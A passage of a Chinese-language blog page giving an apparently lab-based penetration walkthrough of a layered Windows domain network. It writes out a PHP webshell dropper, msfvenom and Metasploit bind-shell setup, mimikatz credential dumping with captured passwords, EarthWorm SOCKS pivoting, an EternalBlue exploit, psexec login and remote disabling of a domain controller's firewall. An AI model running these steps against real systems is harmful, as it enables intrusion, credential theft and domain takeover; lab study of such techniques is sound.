+<p><img alt="截图" src="6b5b588919de0f3cc8d334b485278afe.png" /></p>
+<p>写入木马</p>
+<p><img alt="截图" src="9629b213e8850ffdfd3aef5a8d062bd5.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>&lt;?php fputs(fopen(&#39;../../shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;test&quot;])?&gt;&#39;);?&gt;
+</code></pre></div>
+<p>蚁剑连接</p>
+<p><img alt="截图" src="e2a7337e8d3516a8a6ec2a7b7bbe5b1b.png" /></p>
+<p>直接上传msf的shell进行连接</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe &gt; msf.exe
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>use exploit/multi/handler 
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>set payload windows/meterpreter/bind_tcp
+<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>set rhosts 192.168.52.30
+<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>set lport 4444
+</code></pre></div>
+<p><img alt="截图" src="76aa0bed625c9a6a1d4235d9a03eaacc.png" /></p>
+<p>上线pc1</p>
+<p><img alt="截图" src="891db60b8ee01c46ed415eb2d1ba43bf.png" /></p>
+<p>至此，第一层内网中的主机全部统一到了kali中</p>
+<p><img alt="截图" src="5b17bee00ad5c580c22b9c67cf3c87b7.png" /></p>
+<p>此时，绘制出网络拓扑图如下：</p>
+<p><img alt="截图" src="2213e9f2d5323461abc1ca13f35c0553.png" /></p>
+<h2 id="_7">内网信息收集<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>拿下第二层网络中的Windows 7服务器后，接下来我们对目标内网环境进行信息收集，对目标网络有一个初步的了解:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>ipconfig /all   # 查看本机ip，所在域
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>systeminfo      # 列出系统信息
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>route print     # 打印路由信息
+<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>net view        # 查看局域网内其他主机名
+<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>arp -a          # 查看arp缓存
+<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>whoami
+<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>net start       # 查看开启了哪些服务
+<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>net share       # 查看开启了哪些共享
+<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>
+<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>net user                 # 查看本机用户列表
+<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>net user /domain         # 查看域用户
+<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>net localgroup administrators   # 查看本地管理员组（通常会有域用户）
+<a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>net view /domain         # 查看有几个域
+<a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>net user 用户名 /domain   # 获取指定域用户的信息
+<a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+<a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a>net group 组名 /domain    # 查看域中某工作组
+<a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字
+<a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名
+<a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a>net group &quot;domain controllers&quot; /domain  # 查看域控制器（可能有多台）
+</code></pre></div>
+<p>可知目标网络环境存在一个名为whoamianony.org的域环境，域控制器主机名为DC.whoamianony.org，IP为192.168.93.30，域管理员为Administrator。</p>
+<h2 id="_8">抓取域用户密码<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p>接着，我们使用meterpreter上的kiwi模块尝试抓取域用户及域管理员的密码：</p>
+<blockquote>
+<p>在 Meterpreter 中，migrate 命令的主要作用是将当前的 Meterpreter 会话从一个进程迁移到另一个进程中。这个功能对于保持隐蔽性、稳定性和持久性有重要意义。具体作用包括：</p>
+<p>保持会话稳定性：一些目标进程可能会在短时间内退出或崩溃，迁移到更稳定的进程（例如系统服务进程）能够确保 Meterpreter 会话不会中断，从而维持远程控制。</p>
+<p>提升权限：如果 Meterpreter 会话是在一个权限较低的进程中启动的，迁移到一个高权限的进程（例如系统级进程）可以获得更高的权限，便于执行更高级的操作。</p>
+<p>隐蔽性：将会话迁移到一个常驻且合法的系统进程（例如 explorer.exe 或 svchost.exe）可以帮助避免被发现或终止，因为这些进程通常不会引起系统管理员的注意。</p>
+<p>避免进程终止：某些恶意软件扫描或系统监控工具可能会标记和终止一些非标准的或可疑的进程，迁移到系统关键进程后，攻击者可以避免被轻易检测到。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>load kiwi
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>migrate n     // (n指的是进程号)
+<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>kiwi_cmd privilege::debug
+<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>kiwi_cmd sekurlsa::logonPasswords
+</code></pre></div>
+<p><img alt="截图" src="df991bae31cff11187bebf9a0e0d66d9.png" /></p>
+<p>成功抓取到域用户bunny和域管理员administrator的凭证：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>bunny：Bunny2021
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>administrator：Whoami2021
+</code></pre></div>
+<h2 id="_9">第三层网络渗透<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<p>现在第二层网络已经渗透完了，我们继续入侵第三层网络（192.168.93.1/24）。在第二层网络Windows服务器的meterpreter中添加一个通往192.168.93.1/24网段的路由：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>msf6 exploit(multi/handler) &gt; route add 192.168.93.0 255.255.255.0 4                                                                                                                               
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>[*] Route added                                                                                                                                                                                    
+<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>msf6 exploit(multi/handler) &gt; route print                                                                                                                                                          
+<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>IPv4 Active Routing Table                                                                                                                                                                          
+<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>=========================                                                                                                                                                                          
+<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>
+<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>   Subnet             Netmask            Gateway                                                                                                                                                   
+<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>   ------             -------            -------                                                                                                                                                   
+<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>   192.168.52.0       255.255.255.0      Session 1                                                                                                                                                 
+<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a>   192.168.93.0       255.255.255.0      Session 4                                                                                                                                                 
+<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a>
+<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>[*] There are currently no IPv6 routes defined.
+</code></pre></div>
+<p><strong>路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建一个二级socks5代理服务。</strong></p>
+<p>首先攻击机上执行如下命令添加一个转接隧道，监听1090端口，并将1090端口收到的代理请求发送给1235端口，执行命令：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>./ew_for_linux64 -s lcx_listen -l 1090 -e 1235
+</code></pre></div>
+<p><img alt="截图" src="a89a40dd945a8ef85a3ce106c12824db.png" /></p>
+<p>然后在第二层网络的Windows服务器上传ew_for_Win.exe，并利用ssocksd方式启动999端口的正向socks代理，执行命令：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>msf6 exploit(multi/handler) &gt; sessions 4
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>meterpreter &gt; upload /home/tom/ew_for_Win.exe C:\\Windows\\ew_for_Win.exe
+<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>ew_for_Win.exe -s ssocksd -l 999
+</code></pre></div>
+<p><img alt="截图" src="256191742e64b661f4f43c8644cc1b3e.png" /></p>
+<p>最后，在DMZ区域的Ubuntu 18上传ew_for_linux64并利用lcx_slave方式，将攻击机的1235端口与第二层网络Windows 7的999端口连接起来，执行命令：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>./ew_for_linux64 -s lcx_slave -d 192.168.111.128 -e 1235 -f 192.168.52.30 -g 999
+</code></pre></div>
+<p><img alt="截图" src="dc4a81e8728443ecf424fa0555d25420.png" /></p>
+<p>然后配置proxychains：</p>
+<p><img alt="截图" src="ce3df02c63f2b44a8e2c0ca4f715b7bd.png" /></p>
+<p>此时，就可以设置proxychains等代理工具，通过访问攻击机的1090端口来使用架设在第二层网络Windows主机上的socks代理服务，来进入第三层网络了。</p>
+<p>在第二层网络Windows主机上执行ping命令扫描第三层网络中</p>
+<p>接着，我们使用metasploit的<code>auxiliary/scanner/smb/smb_version</code> 模块（可用来探测Windows主机存活）来扫描第三层网络中的主机存活：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>use auxiliary/scanner/smb/smb_version
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>set rhosts 192.168.93.1-255
+<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>set threads 5
+<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>run
+</code></pre></div>
+<p><img alt="截图" src="9e401863e3fb8024bd07626c654d6205.png" /></p>
+<p>如上图，发现第三层网络中还有两个Windows主机，分别为DC（192.168.93.30）和PC2（192.168.93.40），使用nmap进一步扫描PC2主机信息：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>proxychains4 nmap -Pn -sT -sV 192.168.52.40
+</code></pre></div>
+<p>没发现什么有用的服务，我们直接打一个“永恒之蓝”试试：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>setg Proxies socks5:127.0.0.1:1090
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>use exploit/windows/smb/ms17_010_eternalblue
+<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>set rhosts 192.168.93.40
+<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>set payload windows/x64/meterpreter/bind_tcp
+<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>set rhost 192.168.93.40
+<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>set lport 4444
+<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>exploit
+</code></pre></div>
+<p>第四台靶机拿下.</p>
+<p>此时，绘制出网络拓扑图如下：</p>
+<p><img alt="截图" src="ab4cfa9b58a73fde749f740b9d4d6203.png" /></p>
+<h1 id="_10">进攻域控<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h1>
+<p>现在就剩下域控制器DC了。既然都抓取到域管理员的密码了，那我们直接psexec登陆就得了：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>use exploit/windows/smb/psexec
+<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>set rhosts 192.168.93.30
+<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>set SMBUser administrator
+<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>set SMBPass Whoami2021
+<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>set payload windows/meterpreter/bind_tcp
+<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>set rhost 192.168.93.30
+<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>run
+</code></pre></div>
+<p><img alt="截图" src="d7d1607ec00f03e57ad3ac09a3662329.png" /></p>
+<p>失败了，应该是开了防火墙的原因。</p>
+<p>没关系，我们已经有了域控的密码了，就可以控制第二层网络的Windows 7远程关闭域控的防火墙了。首先控制第二层网络的Windows 7与域控建立ipc连接：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:&quot;Administrator&quot;
+</code></pre></div>
+<p><img alt="截图" src="9a3ec24f45aa661b5fdfa2a2bbac26ca.png" /></p>
+<p>然后执行如下命令，使用sc远程在域制器（192.168.93.30）上创建服务关闭防火墙：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>sc \\192.168.93.30 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>
+<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>sc \\192.168.93.30 start unablefirewall
+</code></pre></div>
+<p>再次尝试执行 exploit/windows/smb/psexec 模块即可成功登录：</p>
+<p>成功拿下域控：</p>
+<p><img alt="截图" src="c183d7a330b2601b25016a3ce5063205.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../javascripts/extra.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
